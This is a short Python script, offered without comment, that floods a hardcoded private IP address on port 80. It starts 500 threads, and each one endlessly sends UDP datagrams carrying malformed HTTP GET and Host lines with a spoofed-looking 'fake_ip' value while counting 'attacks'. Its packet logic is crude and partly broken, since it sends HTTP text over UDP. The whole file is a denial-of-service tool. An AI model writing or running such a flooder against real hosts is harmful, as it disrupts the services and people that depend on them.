import socket
import threading

target = '172.17.8.10'
fake_ip = '127.0.0.1'
port = 80
attack_count = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1/\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_count
        attack_count = attack_count + 1
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
